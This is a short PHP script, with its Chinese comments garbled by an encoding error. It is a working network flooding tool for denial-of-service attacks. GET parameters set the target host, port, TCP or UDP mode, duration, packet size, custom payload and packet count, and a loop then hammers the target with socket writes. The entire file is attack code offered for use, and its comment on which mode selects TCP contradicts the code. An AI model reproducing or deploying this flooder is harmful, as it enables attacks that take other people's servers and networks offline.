<?php 
error_reporting(0);//���ô��󱨸� 
set_time_limit(0);//���ø�ҳ���ִ��ʱ�䡣  0Ϊ����ִ�� 
ignore_user_abort(false); //������ͻ����Ͽ��Ƿ����ֹ�ű���ִ�С� 
   
/*get����*/
$type = $_GET['type']; //������ʽ 0ΪTCP 1ΪUDP 
$host = $_GET['host'];  //����Ŀ�� 
$port = $_GET['port'];  //�����˿� 
$exec_time = $_GET['time'];  //����ʱ�� 
$Sendlen = $_GET['size'];   //�������ݳ���  ���Ϊ0��ʹ���Զ������ݰ� 
$data =  $_GET['data']; //�Զ������ݰ� ���Ϊ1024KB ��ʽΪURL���� 
$data = urldecode($data); //URL�������ַ��� 
$count = $_GET['count']; //���Ʒ�������   0Ϊ������Ȼ��ֻ��ͨ��ʱ����� 
/*end*/
   
if (function_exists('fsockopen')){$test="1";}else{$test="0";}//fsockopen�Ƿ����� 
   
$byte = 0;//��¼�������� 
$max_time = time()+$exec_time;//���ý���ʱ�� 
   
if($Sendlen!=0){ 
    for($i=0;$i<$Sendlen;$i++){$out .= "X";}//����ָ���������ݰ� 
}else{ 
    $out = $data;  //����Ϊ�Զ������ݰ� 
} 
   
//��ѭ���������� 
while(1){ 
    if(time() > $max_time){break;}//ʱ�䵽�˾�����ѭ��         
       
    //�жϹ�����ʽ 
    if($type==1) {     
        $fp = fsockopen("tcp://$host", $port, $errno, $errstr, 5);//��TCP���� 
    } else {     
        $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);//��UDP���� 
    } 
        if($fp){            //������ӳɹ� 
            fwrite($fp, $out);  //�������� 
            fclose($fp);  //�ر����� 
    } 
       
    $byte++;//����������1 
       
    if((int)$count!=0){ 
        if($byte > (int)$count){break;}//���������������õľ�����ѭ�� 
    }    
} 
?>
